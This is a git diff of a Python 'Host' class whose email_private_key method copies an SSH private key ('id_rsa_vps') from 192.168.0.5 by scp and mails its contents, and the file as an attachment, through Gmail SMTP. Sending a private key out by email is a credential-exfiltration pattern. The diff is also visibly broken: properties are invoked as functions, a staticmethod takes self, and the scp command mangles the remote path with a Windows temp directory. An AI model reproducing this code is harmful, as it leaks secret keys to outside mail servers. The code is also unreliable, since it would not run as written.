@@ -32,6 +32,26 @@ class Host(object):
     self.OS = os
     self.eMail = email
 
+  @property
+  def windowsTEMP(self):
+    directory = "C:\\Windows\\Temp\\"
+    return directory
+
+  @property
+  def linuxTEMP(self):
+    directory = "~/.ssh/"
+    return directory
+
+  @property
+  def privateKey(self):
+    key = "id_rsa"
+    return key
+
+  @property
+  def temporaryKey(self):
+    key = "id_rsa_vps"
+    return key
+
   @staticmethod
   def email_private_key(self):
     server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -76,13 +96,13 @@ class Host(object):
     server.starttls()
     server.login(self.eMail[0], self.eMail[1])
 
-    scp_command = """scp snow@192.168.0.5:~/.ssh/id_rsa_vps ."""
+    scp_command = "scp snow@192.168.0.5:~/.ssh/ " + self.windowsTEMP + self.temporaryKey + " ."
 
     CMD().execute(scp_command)
 
     time.sleep(10)
 
-    private_key = open('id_rsa_vps', 'r')
+    private_key = open(self.temporaryKey(), 'r')
 
     mail = MIMEMultipart()
     mail["From"] = self.eMail[0]
@@ -92,8 +112,7 @@ class Host(object):
     content = private_key.read()
     mail.attach(MIMEText(content, "plain"))
 
-    file = "id_rsa_vps"
-    attachment = open(file, "r")
+    attachment = open(self.windowsTEMP() + self.temporaryKey(), "r")
 
     meta = MIMEBase('application', 'octet-stream')
 
@@ -101,7 +120,7 @@ class Host(object):
 
     encoders.encode_base64(meta)
 
-    meta.add_header('Content-Disposition', "attachment; filename= %s" % file)
+    meta.add_header('Content-Disposition', "attachment; filename= %s" % self.privateKey())
 
     mail.attach(meta)
 
